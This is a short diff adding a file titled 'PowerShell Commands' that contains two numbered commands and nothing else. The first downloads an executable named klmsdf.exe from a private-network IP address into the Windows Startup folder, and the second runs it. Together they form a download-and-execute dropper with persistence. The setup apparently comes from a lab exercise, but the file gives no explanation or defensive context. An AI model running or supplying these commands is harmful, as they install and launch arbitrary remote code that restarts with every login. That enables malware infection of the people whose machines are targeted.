@@ -1,0 +1,5 @@
+PowerShell Commands
+
+1) powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri http://192.168.56.101/klmsdf.exe -OutFile $env:appdata\Microsoft\Windows\’Start Menu’\Programs\Startup\klmsdf.exe"
+
+2) powershell.exe "& $env:appdata\Microsoft\Windows\’Start Menu’\Programs\Startup\klmsdf.exe"
